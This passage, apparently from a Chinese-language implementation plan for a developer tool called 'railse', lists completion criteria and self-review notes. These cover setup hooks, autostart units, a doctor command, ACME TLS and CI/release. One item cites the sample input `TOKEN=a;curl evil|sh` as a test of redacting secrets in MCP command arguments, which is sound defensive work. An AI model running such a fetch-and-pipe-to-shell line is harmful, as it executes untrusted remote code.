2. 遗留修复：`{"command":"TOKEN=a;curl evil|sh"}` 的 MCP 参数显示 `TOKEN=<redacted>;curl evil|sh`；`"sshpass" -p`、`SSHPASS -p`、`sshpass -o … -p` 都抹；https 的 `--public-url` 让 cookie 带 Secure；`GET /api/version` 无需登录；推送 4 路并行、订阅上限 20；已吊销机器的问题不进收件箱；守护进程连续 3 次 401 才停用；`railse agent status` 有 `hub:` 行。
3. `railse setup hooks` 把 Claude 钩子写到 `.claude/settings.local.json`，旧的 `settings.json` 条目迁走；`scripts/smoke-claude.sh` 仍通过。
4. `railse setup autostart` 在 macOS 写 plist 并 bootstrap，在 Linux 写用户单元并 enable；`--hub --system` 写带 `CAP_NET_BIND_SERVICE` 的系统单元；`--uninstall`、`--status`、`--dry-run` 可用。
5. `railse doctor` 覆盖设计 5.5 的全部检查（守护进程在跑、hub 可达、三个 CLI 的钩子装好且超时到位、CLI 版本、socket 与配置文件权限），加 hub 侧的数据库、密码、VAPID 与 ACME 目录；任一失败退出 1；`--json` 可用。
6. `railse setup all` 一条命令完成接入、钩子、自启、体检。
7. `railse hub run --acme-domain …` 直出 TLS：autocert 只给该域名签，证书目录 0700，80 端口做挑战与跳转，`PublicURL` 默认 https 域名，cookie Secure；`serveTLS` 的注入证书测试通过。
8. CI 工作流四个作业在 GitHub 上绿（Go、网页、e2e、三平台交叉编译）；打 `v0.1.0` tag 后 release 工作流产出三个 tar.gz 与 `checksums.txt`；`install.sh` 在一台干净的 Mac 或 Linux 上装好并打印版本（需要仓库先推到 GitHub：本计划的“在 GitHub 上绿”与“tag 出包”两项在仓库有远端之后验证，此前以本地 `release --snapshot` 与 `test-install.sh` 为准）。
9. `scripts/smoke-claude-hub.sh` 在作者机器上打印 OK。
10. 文档：`README.md`、`docs/setup.md`、`docs/hub.md`（ACME、自启、doctor）、设计文档 §0.6 与 §1.3 更新。
11. 不在本计划（留后续）：Windows；Bark 渠道（等真机结果）；规则编辑网页；按机器单独暂停；本机 pause 反向同步；e2e 之外的网页组件测试；`enroll_tokens` 的清理（量极小）。

## 自检记录

**设计文档覆盖**
- §5.1 “`railse setup` 用 hub 生成的一次性接入码换取本机长期密钥”：Task 8 `setup all` 调用既有的 `agentEnroll`。
- §5.4 “守护进程由 launchd 或 systemd 托管，崩溃自动拉起”：Task 5（`KeepAlive`、`Restart=always`）；“推送端点返回 410 或连续失败：删除该订阅”已在第 4 份；“协议版本不一致：网页显示哪台机器需升级”：Task 6 doctor 的 `hub.reachable` 报协议不一致（网页侧仍靠机器页版本）。
- §5.5 doctor 六项：守护进程是否在跑（`agent.running`）、hub 是否可达（`hub.reachable`、`agent.hub`）、三个 CLI 的钩子是否装好（`hooks.*`）、CLI 版本是否支持钩子事件（`cli.*`，Gemini ≥ 0.65.0）、钩子超时是否到位（`hooks.*` 的超时下限）、socket 与配置文件权限（`agent.dir`、`agent.files`、`agent.socket`）。
- §6.1 CI：Go `-race`、golangci-lint、网页构建、交叉编译三平台、goreleaser 出包：Task 10、11、12；Playwright 进 CI：Task 11。
- §6.2 平台与安装：三平台（Task 12 的 builds 与 Task 11 的 cross）；`curl` 一行装（Task 12）；`railse setup`（Task 4、5、8）；`railse doctor`（Task 6、7）。
- §7 第 6 步全部覆盖；第 7 步（自用一周）在本计划之后。
- §0.6 的“待改：Claude 钩子改写到 settings.local.json”：Task 4。
- 第 3、4 份终审分流到第 5 份的项：脱敏 MCP 命令字段与 sshpass 变体（Task 1）、`--public-url` 蕴含 Secure（Task 2）、推送并行与上限（Task 2）、问题列表过滤已吊销机器（Task 2）、401 永久停用（Task 3）、直出 TLS 的 ReadTimeout（Task 2）、VAPID 损坏诊断（Task 6）、CI 与 e2e 超时（Task 11）、`go.mod` 忽略 `web/node_modules`（Task 10）、发布从干净目录构建（goreleaser `--clean`，Task 12）。未纳入：`enroll_tokens` 清理、hub 记 `session_end`（量小、无用户可见价值，列在完成标准第 11 条）。

**类型一致性**
- `hooksconf.Plan/Merge/Inspect/Expected/ClaudePaths/GeminiPath/CodexPath`：Task 4 定义，Task 6（doctor）与 Task 8（setup all 经 `runSetup`）使用。
- `proto.Status.Hub/HubURL`：Task 3 定义，Task 6 的 `agentChecks` 读取；`hookclient.Client.Control("status")` 返回 `ControlReply.Status *proto.Status`（第 2 份既有）。
- `store.SchemaVersion`：Task 6 导出并使用；`push.ParseVAPID`、`wire.Proto`：第 4、3 份既有。
- `hub.Config.Version/ACMEDomain/ACMEEmail/ACMECacheDir/ACMEHTTPListen`：Task 2、9 定义，`cmd/railse/hub.go` 的 `hubConfigFromArgs` 赋值。
- `runAutostart`（Task 5）被 Task 8 调用；`runDoctor`（Task 7）被 Task 8 调用；`agentConfigFor`（Task 7）被 Task 8 使用。
- `cmdRec`（Task 5 测试辅助）在 Task 8 测试里复用；`startTestHub`、`mkTemp`、`fieldAfter` 是第 3、4 份 `cmd/railse` 测试里已有的名字（以仓库为准）。

**占位扫描**：全文无 TODO/TBD/待定；Task 10 的 LICENSE 用标准文本下载而非占位；Task 12 的 goreleaser 与 golangci-lint 版本号给出，并写明版本不存在时的处理方法。

**已知取舍**
- doctor 的 CLI 版本检查只对 Gemini 设下限（有实测依据），Claude 与 Codex 只在版本与录制样本不同时警告，不阻塞。
- `setup all` 把 doctor 的失败当信息展示不当失败：刚托管的守护进程可能还没起来。
- ACME 只支持 Let's Encrypt 默认目录与 80/443；别的端口或别的 CA 用反向代理方案。
- `install.sh` 不做签名验证，只做 sha256（checksums 与包来自同一处）；签名留到有发布密钥之后。
- hub 系统单元以普通用户加 `CAP_NET_BIND_SERVICE` 运行，不以 root 运行。
